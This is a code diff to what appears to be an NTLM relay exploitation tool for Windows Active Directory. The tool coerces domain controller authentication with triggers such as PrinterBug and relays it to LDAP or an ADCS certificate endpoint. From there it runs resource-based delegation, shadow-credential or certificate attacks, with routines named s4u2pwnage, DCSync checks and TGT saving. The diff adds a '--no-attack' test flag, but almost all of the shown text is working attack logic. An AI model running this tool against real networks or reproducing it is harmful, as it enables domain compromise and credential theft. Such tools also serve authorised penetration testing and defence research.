@@ -55,60 +55,61 @@ def startServers(userDomain, userName, password, address, kdc, adcs, callback, o
     start = time.time()
     logging.info("Current attack method is ==> {}".format(options.method.upper()))
     logging.info("Current trigger is  ==> {}".format(options.trigger.upper()))
-    target_dc = kdc
-    PoppedDB		= Manager().dict()	# A dict of PoppedUsers
-    PoppedDB_Lock	= Lock()			# A lock for opening the dict
-    c = NTLMRelayxConfig()
-    target_ldap = "ldap" if options.ldap else "ldaps"
-    c.setProtocolClients(PROTOCOL_CLIENTS)
-    if options.method == "rbcd":
-        c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
-        c.addcomputer = options.add_computer
-        c.dumplaps = False
-        c.dumpgmsa = False
-        c.sid = None
-        c.delegateaccess = True
-        c.escalateuser = userName
-    elif options.method == "sdcd":
-        c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
-        c.addcomputer = options.add_computer
-        c.dumplaps = False
-        c.dumpgmsa = False
-        c.sid = None
-        c.shadowcredential = True
-        c.delegateaccess = False
-        c.kdc = kdc
-        c.userDomain = userDomain
-        c.aclattack = False
-    else:
-        if options.ssl:
-            target = "https://"+adcs+"/certsrv/certfnsh.asp"
+    if not options.no_attack:
+        target_dc = kdc
+        PoppedDB		= Manager().dict()	# A dict of PoppedUsers
+        PoppedDB_Lock	= Lock()			# A lock for opening the dict
+        c = NTLMRelayxConfig()
+        target_ldap = "ldap" if options.ldap else "ldaps"
+        c.setProtocolClients(PROTOCOL_CLIENTS)
+        if options.method == "rbcd":
+            c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
+            c.addcomputer = options.add_computer
+            c.dumplaps = False
+            c.dumpgmsa = False
+            c.sid = None
+            c.delegateaccess = True
+            c.escalateuser = userName
+        elif options.method == "sdcd":
+            c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
+            c.addcomputer = options.add_computer
+            c.dumplaps = False
+            c.dumpgmsa = False
+            c.sid = None
+            c.shadowcredential = True
+            c.delegateaccess = False
+            c.kdc = kdc
+            c.userDomain = userDomain
+            c.aclattack = False
         else:
-            target = "http://"+adcs+"/certsrv/certfnsh.asp"
-        c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
-        c.setIsADCSAttack(kdc)
-        c.setADCSOptions(options.template)
-    c.setOutputFile(None)
-    c.setEncoding('ascii')
-    c.setMode('RELAY')
-    c.setAttacks(PROTOCOL_ATTACKS)
-    c.setLootdir('.')
-    c.setInterfaceIp("0.0.0.0")
-    c.setExploitOptions(True,False)
-    c.setSMB2Support(True)
-    c.setListeningPort(options.smb_port)
-    c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
-    c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
-    s = SMBRelayServer(c)
-    s.start()
-    logging.info("Relay servers started, waiting for connection....")
+            if options.ssl:
+                target = "https://"+adcs+"/certsrv/certfnsh.asp"
+            else:
+                target = "http://"+adcs+"/certsrv/certfnsh.asp"
+            c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
+            c.setIsADCSAttack(kdc)
+            c.setADCSOptions(options.template)
+        c.setOutputFile(None)
+        c.setEncoding('ascii')
+        c.setMode('RELAY')
+        c.setAttacks(PROTOCOL_ATTACKS)
+        c.setLootdir('.')
+        c.setInterfaceIp("0.0.0.0")
+        c.setExploitOptions(True,False)
+        c.setSMB2Support(True)
+        c.setListeningPort(options.smb_port)
+        c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
+        c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
+        s = SMBRelayServer(c)
+        s.start()
+        logging.info("Relay servers started, waiting for connection....")
     try:
         if not options.no_trigger:
-            status = exploit(userDomain, userName, password, address, kdc, callback, options)
+            status = exploit(userDomain, userName, password, address, callback, options)
         else:
             status = True
-        if status:
-            exp = Thread(target=checkauth, args=(userDomain, userName, password, address, kdc, callback, options,))
+        if status and not options.no_attack:
+            exp = Thread(target=checkauth, args=(userDomain, kdc, options,))
             exp.daemon = True
             exp.start()
             try:
@@ -120,17 +121,18 @@ def startServers(userDomain, userName, password, address, kdc, adcs, callback, o
                     pass
             except KeyboardInterrupt as e:
                 logging.info("Shutting down...")
-                s.server.shutdown()
+        elif options.no_attack:
+            logging.info("Done.")
         else:
             logging.error("Error in exploit, Shutting down...")
-            s.server.shutdown()
     except Exception as e:
-        logging.error("Error in exploit, Shutting down...")
-        logging.info("Shutting down...")
-        s.server.shutdown()
+        logging.info("Shutting down..., error {}".format(e))
+    finally:
+        if not options.no_attack:
+            s.server.shutdown()
 
 
-def checkauth(userDomain, userName, password, address, kdc, callback, options):
+def checkauth(userDomain, kdc, options):
     getpriv = config.get_priv()
     dcync = config.get_dcsync()
     pki = config.get_pki()
@@ -139,7 +141,7 @@ def checkauth(userDomain, userName, password, address, kdc, callback, options):
             if dcync:
                 break
             elif options.method == "rbcd":
-                s4u2pwnage(userDomain, userName, password, address, kdc, callback, options)
+                s4u2pwnage(userDomain, kdc, options)
                 break
             elif options.method == "sdcd":
                 break
@@ -158,7 +160,7 @@ def checkauth(userDomain, userName, password, address, kdc, callback, options):
             break
 
 
-def s4u2pwnage(userDomain, userName, password, address, kdc, callback, options):
+def s4u2pwnage(userDomain, kdc, options):
     logging.info("Executing s4u2pwnage..")
     new_username = config.get_newUser()
     new_password = config.get_newPassword()
@@ -232,7 +234,7 @@ def pki2TGT(domain,options):
     logging.critical('Saved TGT to file {}'.format(cachefile))
 
 
-def exploit(userDomain, userName, password, address, kdc, callback, options):
+def exploit(userDomain, userName, password, address, callback, options):
     try:
         if options.trigger == "printer":
             lookup = PrinterBug(userName, password, userDomain, int(options.rpc_smb_port), options.hashes, callback)
@@ -284,6 +286,7 @@ def main():
     parser.add_argument("--debug", action='store_true',help='Enable debug output')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('--no-trigger', action='store_true', help='Start exploit server without trigger.')
+    parser.add_argument('--no-attack', action='store_true', help='Start trigger for test.')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for account auth (instead of password)')
@@ -327,6 +330,7 @@ def main():
         parser.print_help()
         sys.exit(1)
 
+
     options = parser.parse_args()
     logger.init(options.ts)
     if options.debug is True:
@@ -341,6 +345,11 @@ def main():
     if userDomain == '':
         logging.critical('userDomain should be specified!')
         sys.exit(1)
+
+    if options.no_trigger:
+        options.trigger = "no trigger"
+    if options.no_attack:
+        options.method = "no attack"
 
     if options.target_ip is None:
         options.target_ip = address
